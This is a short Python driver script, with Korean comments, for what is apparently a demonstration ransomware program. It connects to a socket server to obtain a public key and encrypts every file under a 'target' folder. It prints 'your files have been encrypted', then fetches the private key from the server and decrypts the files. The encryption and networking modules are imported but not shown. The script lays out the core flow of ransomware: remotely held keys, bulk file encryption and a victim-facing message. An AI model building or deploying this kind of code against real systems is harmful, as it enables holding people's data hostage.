from socketclient import SocketClient
from fileencryptor import FileEncryptor
from filedecryptor import FileDecryptor

def main():
    client = SocketClient()
    client.start()
    public_key = client.get_key(0) # public key 가져옴
    
    file_encryptor = FileEncryptor(public_key)
    file_encryptor.encrypt('./../target/*') # target 폴더 내부 암호화

    print('your files have been encrypted.')
    print('if you want to decrypt, enter any button')
    input()

    private_key = client.get_key(1) # private key 가져옴
    client.stop() # 연결 종료

    file_decryptor = FileDecryptor(private_key)
    file_decryptor.decrypt('./../target/*') # target 폴더 내부 복호화

if __name__ == '__main__':
    main()